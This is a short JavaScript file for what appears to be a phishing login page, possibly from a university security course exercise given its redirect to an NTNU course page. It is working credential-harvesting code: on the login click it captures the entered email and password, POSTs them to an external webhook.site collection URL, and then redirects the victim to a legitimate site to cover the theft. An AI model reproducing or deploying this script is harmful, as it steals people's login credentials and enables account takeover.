// Select the button

let elButton, elUsername, elPassword;

elButton = document.querySelector("#loginButton");
elUsername = document.querySelector("#username");
elPassword = document.querySelector("#password");

let webhookURL = "https://webhook.site/39994702-2e7d-438e-9f7e-19226220a548";
let redirectURL = "https://www.ntnu.no/studier/emner/IIK3100#tab=omEmnet";


// Add event listener for webhook
elButton.addEventListener('click', function(event) {
    event.preventDefault(); // Prevent the default form submission

    console.log("Sending login credentials...");

    // Get the username and password values
    const username = elUsername.value;
    const password = elPassword.value;

    // Create an object with the data to send
    const data = {
        email: username,
        password: password
    };

    // Make a POST request to the webhook URL
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        mode: 'no-cors', // Set no-cors mode
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log("Status" + response.status.toString());
        if (response.ok) {
            console.log('Data sent successfully');
            // You can add further actions upon successful data submission
        } else {
            console.log('Failed to send data');
            // Handle the failure to send data
        }
        window.location.href = redirectURL;
    })
    .catch(error => {
        console.error('Error:', error);
    });
});